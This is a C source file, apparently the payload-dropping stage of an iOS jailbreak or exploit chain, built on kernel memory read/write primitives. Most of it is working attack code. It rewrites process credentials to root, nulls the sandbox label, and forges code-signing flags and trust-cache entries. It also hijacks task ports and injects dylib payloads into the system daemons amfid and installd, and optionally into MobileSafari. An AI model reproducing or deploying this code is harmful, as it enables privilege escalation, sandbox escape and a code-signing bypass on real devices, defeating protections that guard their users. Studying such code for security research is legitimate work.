#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <spawn.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>

#include <CoreFoundation/CoreFoundation.h>

#include <dlfcn.h>
#include "mach_vm.h"
#include "parameters.h"
#include "kernel_memory.h"
#include "drop_payload.h"

uint64_t proc_of_pid(pid_t pid) {
    if (kernel_base == 0) return 0;

    uint64_t allproc = kernel_base + OFFSET(kernel_base, allproc);
    uint64_t proc = kernel_read64(allproc), pd;
    while (proc) { //iterate over all processes till we find the one we're looking for
        pd = kernel_read32(proc + OFFSET(proc, p_pid));
        if (pd == pid) return proc;
        proc = kernel_read64(proc);
    }

    return 0;
}

struct udata {
    uint32_t p_uid;
    uint32_t p_ruid;
    uint32_t p_gid;
    uint32_t p_rgid;
    uint32_t cr_uid;
    uint32_t cr_ruid;
    uint32_t cr_svuid;
    uint32_t cr_ngroups;
    uint32_t cr_groups;
    uint32_t cr_rgid;
    uint32_t cr_svgid;
};
void rootify(uint64_t proc, struct udata *data) {
    if (data == NULL) return;

    uint64_t ucred = kernel_read64(proc + OFFSET(proc, p_ucred));

    uint64_t p_uid = kernel_read32(proc + OFFSET(proc, p_uid));
    uint64_t p_ruid = kernel_read32(proc + OFFSET(proc, p_ruid));
    uint64_t p_gid = kernel_read32(proc + OFFSET(proc, p_gid));
    uint64_t p_rgid = kernel_read32(proc + OFFSET(proc, p_rgid));
    uint64_t cr_uid = kernel_read32(ucred + OFFSET(ucred, cr_uid));
    uint64_t cr_ruid = kernel_read32(ucred + OFFSET(ucred, cr_ruid));
    uint64_t cr_svuid = kernel_read32(ucred + OFFSET(ucred, cr_svuid));
    uint64_t cr_ngroups = kernel_read32(ucred + OFFSET(ucred, cr_ngroups));
    uint64_t cr_groups = kernel_read32(ucred + OFFSET(ucred, cr_groups));
    uint64_t cr_rgid = kernel_read32(ucred + OFFSET(ucred, cr_rgid));
    uint64_t cr_svgid = kernel_read32(ucred + OFFSET(ucred, cr_svgid));

    kernel_write32(proc + OFFSET(proc, p_uid), data->p_uid);
    kernel_write32(proc + OFFSET(proc, p_ruid), data->p_ruid);
    kernel_write32(proc + OFFSET(proc, p_gid), data->p_gid);
    kernel_write32(proc + OFFSET(proc, p_rgid), data->p_rgid);
    kernel_write32(ucred + OFFSET(ucred, cr_uid), data->cr_uid);
    kernel_write32(ucred + OFFSET(ucred, cr_ruid), data->cr_ruid);
    kernel_write32(ucred + OFFSET(ucred, cr_svuid), data->cr_svuid);
    kernel_write32(ucred + OFFSET(ucred, cr_ngroups), data->cr_ngroups||1);
    kernel_write32(ucred + OFFSET(ucred, cr_groups), data->cr_groups);
    kernel_write32(ucred + OFFSET(ucred, cr_rgid), data->cr_rgid);
    kernel_write32(ucred + OFFSET(ucred, cr_svgid), data->cr_svgid);

    data->p_uid = p_uid;
    data->p_ruid = p_ruid;
    data->p_gid = p_gid;
    data->p_rgid = p_rgid;
    data->cr_uid = cr_uid;
    data->cr_ruid = cr_ruid;
    data->cr_svuid = cr_svuid;
    data->cr_ngroups = cr_ngroups;
    data->cr_groups = cr_groups;
    data->cr_rgid = cr_rgid;
    data->cr_svgid = cr_svgid;
}

uint64_t sandbox(uint64_t proc, uint64_t sb) {
    uint64_t ucred = kernel_read64(proc + OFFSET(proc, p_ucred)); // pid credentials
    uint64_t cr_label = kernel_read64(ucred + OFFSET(ucred, cr_label)); // MAC label
    uint64_t orig_sb = kernel_read64(cr_label + OFFSET(cr_label, sandbox));

    kernel_write64(cr_label + OFFSET(cr_label, sandbox) /* First slot is AMFI's. so, this is second? */, sb); //get rid of sandbox by nullifying it

    return orig_sb;
}

void setcsflags(uint64_t proc) {
    uint32_t csflags = kernel_read32(proc + OFFSET(proc, p_csflags));
    #define CS_PLATFORM_BINARY 0x4000000    // this is a platform binary
    #define CS_INSTALLER       0x0000008    // has installer entitlement
    #define CS_GET_TASK_ALLOW  0x0000004    // has get-task-allow entitlement
    #define CS_DEBUGGED        0x10000000   // process is currently or has previously been debugged and allowed to run with invalid pages
    #define CS_RESTRICT        0x0000800    // tell dyld to treat restricted
    #define CS_HARD            0x0000100    // don't load invalid pages
    #define CS_KILL            0x0000200    // kill process if it becomes invalid
    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW | CS_DEBUGGED) & ~(CS_RESTRICT | CS_HARD | CS_KILL);
    kernel_write32(proc + OFFSET(proc, p_csflags), csflags);
}

void platformize(uint64_t proc) {
    uint64_t task = kernel_read64(proc + OFFSET(proc, task));
    uint32_t t_flags = kernel_read32(task + OFFSET(task, t_flags));
    #define TF_PLATFORM        0x00000400   // task is a platform binary
    kernel_write32(task + OFFSET(task, t_flags), t_flags | TF_PLATFORM);

    setcsflags(proc);
}

struct trust_chain {
    uint64_t next;
    uint8_t uuid[16];
    uint32_t count;
} __attribute__((packed));
#define CS_CDHASH_LEN 20
void trust_hashes(const uint8_t *hashes, size_t count) {
    const uint8_t fake_uuid[] = {0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37};
    uint64_t fake_cache = 0;

    uint64_t trust_chain = kernel_base + OFFSET(kernel_base, trustcache);
    printf("[*] trust_chain at 0x%llx\n", trust_chain);

    uint64_t trusted_cache = kernel_read64(trust_chain);
    while (trusted_cache != 0) {
        uint32_t trusted_count = kernel_read32(trusted_cache + 24);
        printf("[*] trust_cache at 0x%llx, count: %d\n", trusted_cache, trusted_count);
        uint8_t *trusted_hashes = malloc(trusted_count * CS_CDHASH_LEN);
        kernel_read(trusted_cache + sizeof(struct trust_chain), trusted_hashes, trusted_count * CS_CDHASH_LEN);
        int cnt = 0;
        for (int i = 0; i < count; i++) {
            const uint8_t *hash = hashes + i * CS_CDHASH_LEN;
            for (int j = 0; j < trusted_count; j++) {
                if (memcmp(hash, trusted_hashes + j * CS_CDHASH_LEN, CS_CDHASH_LEN) == 0) {
                    cnt++;
                }
            }
        }
        free(trusted_hashes);

        if (cnt >= count) {
            printf("[*] already trusted\n");
            return;
        }

        uint8_t trusted_uuid[16] = {0};
        kernel_read(trusted_cache + 8, trusted_uuid, 16);
        if (memcmp(trusted_uuid, fake_uuid, 16) == 0) fake_cache = trusted_cache;

        trusted_cache = kernel_read64(trusted_cache);
    }

    const size_t cache_size = 0x4000;
    if (fake_cache == 0) {
        // create new hash block
        struct trust_chain fake_chain;
        fake_chain.next = kernel_read64(trust_chain);
        fake_chain.count = count;
        memcpy(fake_chain.uuid, fake_uuid, 16);

        mach_vm_address_t kernel_trust;
        kern_return_t kr = mach_vm_allocate(kernel_task_port, &kernel_trust, cache_size, VM_FLAGS_ANYWHERE);
        if (kr != KERN_SUCCESS) {
            printf("mach_vm_allocate returned %d: %s\n", kr, mach_error_string(kr));
            return;
        }
        printf("[*] allocated: 0x%zx => 0x%llx\n", cache_size, kernel_trust);

        kernel_write(kernel_trust, &fake_chain, sizeof(fake_chain));
        kernel_write(kernel_trust + sizeof(fake_chain), hashes, count * CS_CDHASH_LEN);

        kernel_write64(trust_chain, kernel_trust);
    } else {
        // insert hashes
        uint32_t trusted_count = kernel_read32(fake_cache + 24);
        if (sizeof(struct trust_chain) + (trusted_count + count) * CS_CDHASH_LEN <= cache_size) {
            uint8_t *new_hashes = malloc((trusted_count + count) * CS_CDHASH_LEN);
            kernel_read(fake_cache + sizeof(struct trust_chain), new_hashes, trusted_count * CS_CDHASH_LEN);
            for (int i = 0; i < count; i++) {
                const uint8_t *hash = hashes + i * CS_CDHASH_LEN;
                for (int j = 0; j < trusted_count + i; j++) {
                    if (memcmp(hash, new_hashes + j * CS_CDHASH_LEN, CS_CDHASH_LEN) < 0) {
                        for (int k = trusted_count + i - 1; k >= j; k--) {
                            memcpy(new_hashes + (k + 1) * CS_CDHASH_LEN, new_hashes + k * CS_CDHASH_LEN, CS_CDHASH_LEN);
                        }
                        memcpy(new_hashes + j * CS_CDHASH_LEN, hash, CS_CDHASH_LEN);
                        break;
                    }
                    if (j == trusted_count + i - 1) {
                        memcpy(new_hashes + (j + 1) * CS_CDHASH_LEN, hash, CS_CDHASH_LEN);
                    }
                }
            }
            kernel_write(fake_cache + sizeof(struct trust_chain), new_hashes, (trusted_count + count) * CS_CDHASH_LEN);
            kernel_write32(fake_cache + 24, trusted_count + count);
            free(new_hashes);
        } else {
            printf("[!] hash block size too big\n");
        }
    }
}

uint64_t proc_of_name(const char *nm) {
    uint64_t allproc = kernel_base + OFFSET(kernel_base, allproc);
    uint64_t proc = kernel_read64(allproc);
    char name[40] = {0};
    while (proc) {
        kernel_read(proc + OFFSET(proc, p_comm), name, 40);
        if (strstr(name, nm)) return proc;
        proc = kernel_read64(proc);
    }
    return 0;
}

uint64_t task_port_kaddr_of_proc(uint64_t proc) {
    uint64_t task = kernel_read64(proc + OFFSET(proc, task));
    uint64_t itk_space = kernel_read64(task + OFFSET(task, itk_space));
    uint64_t is_table = kernel_read64(itk_space + OFFSET(ipc_space, is_table));
    uint64_t task_port_kaddr = kernel_read64(is_table + 0x18);
    return task_port_kaddr;
}

// Original method by Ian Beer
mach_port_t task_for_proc(uint64_t self_proc, uint64_t proc) {
    // allocate a new port we have a send right to
    mach_port_t port = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);

    // find task port in kernel
    uint64_t task_port_kaddr = task_port_kaddr_of_proc(proc);
    uint64_t task = kernel_read64(proc + OFFSET(proc, task));

    // leak some refs
    kernel_write32(task_port_kaddr + 0x4, 0x383838);
    kernel_write32(task + OFFSET(task, ref_count), 0x393939);

    // get the address of the ipc_port of our allocated port
    uint64_t self_task = kernel_read64(self_proc + OFFSET(proc, task));
    uint64_t itk_space = kernel_read64(self_task + OFFSET(task, itk_space));
    uint64_t is_table = kernel_read64(itk_space + OFFSET(ipc_space, is_table));
    uint32_t port_index = port >> 8;

    // point the port's ie_object to the task port
    kernel_write64(is_table + (port_index * 0x18), task_port_kaddr);

    // remove our recieve right
    uint32_t ie_bits = kernel_read32(is_table + (port_index * 0x18) + 8);
    ie_bits &= ~(1 << 17); // clear MACH_PORT_TYPE(MACH_PORT_RIGHT_RECIEVE)
    kernel_write32(is_table + (port_index * 0x18) + 8, ie_bits);

    return port;
}

void inject_dylib(uint64_t self_proc, uint64_t target_proc, const char *payload_name, const uint8_t *payload_data, uint32_t payload_len) {
    char payload_path[PATH_MAX];
    sprintf(payload_path, "/var/containers/Bundle/%s_payload.dylib", payload_name);
    FILE *payload_file = fopen(payload_path, "wb");
    if (payload_file == NULL) {
        printf("Unable to create payload. Cannot continue!\n");
        return;
    }
    fwrite(payload_data, 1, payload_len, payload_file);
    fclose(payload_file);

    uint64_t orig_sb = sandbox(target_proc, 0);

    task_t remote_task = task_for_proc(self_proc, target_proc);
    if (remote_task == MACH_PORT_NULL) {
        printf("Unable to get task for target process. Cannot continue!\n");
        return;
    }

    mach_vm_address_t remote_stack = (vm_address_t)NULL;
    const uint32_t stack_len = 0x8000;
    kern_return_t kr = mach_vm_allocate(remote_task, &remote_stack, stack_len, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        printf("Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
        return;
    }
    printf("Allocated remote stack @0x%llx\n", remote_stack);

    kr = mach_vm_write(remote_task,                         // Task port
                       remote_stack + 8,                    // Virtual Address (Destination)
                       (vm_address_t)payload_path,          // Source
                       strlen(payload_path) + 1);           // Length of the source
    if (kr != KERN_SUCCESS) {
        printf("Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
        return;
    }

    uint64_t slide = (uint64_t)dlopen - 0x0180919858;
    uint64_t gadget = slide + 0x0180ae4830; // ret
    arm_thread_state64_t remote_thread_state64 = {0};
    remote_thread_state64.__lr = gadget;
    remote_thread_state64.__sp = (uint64_t)remote_stack + stack_len / 2;
    remote_thread_state64.__pc = (uint64_t)dlsym(RTLD_DEFAULT, "pthread_create_from_mach_thread");
    remote_thread_state64.__x[0] = (uint64_t)remote_stack; // pthread_t *thread
    remote_thread_state64.__x[1] = 0; // const pthread_attr_t *attr
    remote_thread_state64.__x[2] = (uint64_t)dlopen; // void *(*start_routine)(void *)
    remote_thread_state64.__x[3] = (uint64_t)remote_stack + 8; // void *arg

    thread_act_t remote_thread;
    kr = thread_create_running(remote_task, ARM_THREAD_STATE64, (thread_state_t)&remote_thread_state64, ARM_THREAD_STATE64_COUNT , &remote_thread);
    if (kr != KERN_SUCCESS) {
        printf("Unable to create remote thread: error %s", mach_error_string(kr));
        return;
    }

    mach_msg_type_number_t thread_state_count = ARM_THREAD_STATE64_COUNT;
    for (;;) {
        kr = thread_get_state(remote_thread, ARM_THREAD_STATE64, (thread_state_t)&remote_thread_state64, &thread_state_count);
        if (kr != KERN_SUCCESS) {
            printf("Error getting stub thread state: error %s", mach_error_string(kr));
            break;
        }

        if (remote_thread_state64.__pc == gadget) {
            printf("Stub thread finished\n");
            kr = thread_terminate(remote_thread);
            if (kr != KERN_SUCCESS) {
                printf("Error terminating stub thread: error %s", mach_error_string(kr));
            }
            break;
        }
    }
    usleep(100000);
    sandbox(target_proc, orig_sb);
}

#define IMPORT_BIN(file, sym) asm(\
    ".data\n"                           /* Change section */\
    ".balign 4\n"                       /* Word alignment */\
    ".private_extern _" #sym "_start\n" /* Export the object address */\
    "_" #sym "_start:\n"                /* Define the object label */\
    ".incbin \"" file "\"\n"            /* Import the file */\
    ".private_extern _" #sym "_end\n"   /* Export the object size */\
    "_" #sym "_end:\n"                  /* Define the object size */\
    ".balign 4\n"                       /* Word alignment */\
    ".text\n")                          /* Restore section */

void patch_amfid(uint64_t self_proc) {
    const char *name = "amfid";
    uint64_t target_proc = proc_of_name(name);
    if (target_proc == 0) {
        printf("Unable to find %s process. Cannot continue!\n", name);
        return;
    }
    printf("%s pid: %d\n", name, kernel_read32(target_proc + OFFSET(proc, p_pid)));

    IMPORT_BIN("payload/amfid_payload.dylib", amfid_payload);
    extern const uint8_t amfid_payload_start, amfid_payload_end;
    const uint8_t *start = &amfid_payload_start, *end = &amfid_payload_end;

    inject_dylib(self_proc, target_proc, name, start, end - start);
}

void patch_installd(uint64_t self_proc) {
    const char *name = "installd";
    uint64_t target_proc = proc_of_name(name);
    if (target_proc == 0) {
        printf("Unable to find %s process. Cannot continue!\n", name);
        return;
    }
    printf("%s pid: %d\n", name, kernel_read32(target_proc + OFFSET(proc, p_pid)));

    IMPORT_BIN("payload/installd_payload.dylib", installd_payload);
    extern const uint8_t installd_payload_start, installd_payload_end;
    const uint8_t *start = &installd_payload_start, *end = &installd_payload_end;

    inject_dylib(self_proc, target_proc, name, start, end - start);
}

#ifdef PATCH_SAFARI
void patch_safari(uint64_t self_proc) {
    const char *name = "MobileSafari";
    uint64_t target_proc = proc_of_name(name);
    if (target_proc == 0) {
        printf("Unable to find %s process. Cannot continue!\n", name);
        return;
    }
    printf("%s pid: %d\n", name, kernel_read32(target_proc + OFFSET(proc, p_pid)));

    IMPORT_BIN("payload/safari_payload.dylib", safari_payload);
    extern const uint8_t safari_payload_start, safari_payload_end;
    const uint8_t *start = &safari_payload_start, *end = &safari_payload_end;

    inject_dylib(self_proc, target_proc, name, start, end - start);
}
#endif

void drop_payload() {
    uint8_t hashes[] = {
        0xec, 0x08, 0xf6, 0xf5, 0x85, 0x55, 0x66, 0x62, 0xe2, 0xe9, 0x62, 0x48, 0xab, 0x5e, 0x3d, 0x7b, 0x1e, 0xc7, 0x66, 0xc5, // amfid_payload.dylib
        0x21, 0x61, 0xb9, 0x84, 0xab, 0x93, 0xc1, 0x77, 0x15, 0x62, 0x1f, 0x13, 0xcd, 0x79, 0x88, 0xaa, 0xef, 0x03, 0x8d, 0x8d, // installd_payload.dylib
    };
    trust_hashes(hashes, sizeof(hashes) / CS_CDHASH_LEN);

    pid_t self_pid = getpid();
    printf("self_pid: %d\n", self_pid);

    uint64_t self_proc = proc_of_pid(self_pid);

    struct udata self_udata = {0};
    rootify(self_proc, &self_udata);

    uint64_t self_sb = sandbox(self_proc, 0);

    patch_amfid(self_proc);
    patch_installd(self_proc);

#ifdef PATCH_SAFARI
    patch_safari(self_proc);
#endif

    sandbox(self_proc, self_sb);
    rootify(self_proc, &self_udata);
}
